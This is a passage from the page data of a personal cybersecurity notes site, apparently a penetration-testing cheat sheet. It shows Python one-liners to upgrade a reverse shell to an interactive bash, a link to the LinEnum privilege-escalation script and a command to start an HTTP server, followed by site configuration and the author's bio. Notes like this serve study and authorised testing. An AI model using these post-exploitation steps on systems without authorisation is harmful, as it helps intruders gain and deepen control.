punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token delimiter important\"\u003e?\u003e\u003c/span\u003e\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"upgrade-reverse-shell\"\u003eUpgrade reverse shell\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#upgrade-reverse-shell\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003epython \u003cspan class=\"token operator\"\u003e-\u003c/span\u003ec \u003cspan class=\"token string\"\u003e'import pty; pty.spawn(\"/bin/bash\")'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOR\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003epython3 \u003cspan class=\"token operator\"\u003e-\u003c/span\u003ec \u003cspan class=\"token string\"\u003e'import pty; pty.spawn(\"/bin/bash\")'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"privilege-escalation-checks\"\u003ePrivilege escalation checks\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#privilege-escalation-checks\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cdiv class=\"table-responsive\"\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003eFile:\u003c/th\u003e\u003cth\u003eWhat it does/testing:\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003ca href=\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"\u003eLinEnum.sh\u003c/a\u003e\u003c/td\u003e\u003ctd\u003eAutomated privilege escalation checks\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/div\u003e\n\u003ch2 id=\"start-python-http-server\"\u003eStart Python HTTP server\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#start-python-http-server\"\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003esudo python3 \u003cspan class=\"token operator\"\u003e-\u003c/span\u003em http\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eserver \u003cspan class=\"token number\"\u003e8080\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003cstrong\u003eBacklinks\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/Notes/notes/t7zelcb6b17opo2gjy4y9cq\"\u003eCheat Sheets:\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","noteIndex":{"id":"dkhaxs77zw01c445jl4oetr","title":"My Dendron Notes","desc":"","updated":1703545954419,"created":1673083387776,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"7f471efbabd9262e18133bac0489cf83","links":[],"anchors":{"welcome-to-my-dendron-notes":{"type":"header","text":"Welcome to my Dendron Notes:","value":"welcome-to-my-dendron-notes","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":11,"column":0,"depth":2}},"children":["irggoj29glx2y8z3yum2w64","t7zelcb6b17opo2gjy4y9cq","h42642wolzf824la84a6bb7","m7j2ktba2hjk9l6avnxa7bw"],"parent":null,"data":{},"body":"# Welcome to my Dendron Notes:\n\nI am a Cyber Security Analyst/Network Administrator. A highly motivated and energetic individual, ready to start work as soon as possible. Ready to learn new skills, take on challenges and complete any education/licensing examinations necessary for career growth. Proactive critical thinker and quick learner with extremely strong work ethic. An effective problem solver who brings both technical aptitude and an understanding of business processes. Able to leverage background in finance and technical skills to evaluate complex problems faced by business. Motivated by innovation and seeking to join an organisation that will provide opportunities for professional development in a dynamic and technical team environment. Passionate about cyber security and focused on governance, risk and compliance. Member of AISA (Australian Information Security Association).\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"My Dendron Notes","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","assetsPrefix":"/Notes","siteUrl":"https://greguus.github.io/","enableHierarchyDisplay":false,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"phd6lr0llsyy9qcbykd4b25"},"buildId":"j9CSGb22FfOPbRIS6QcPV","assetPrefix":"/Notes","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
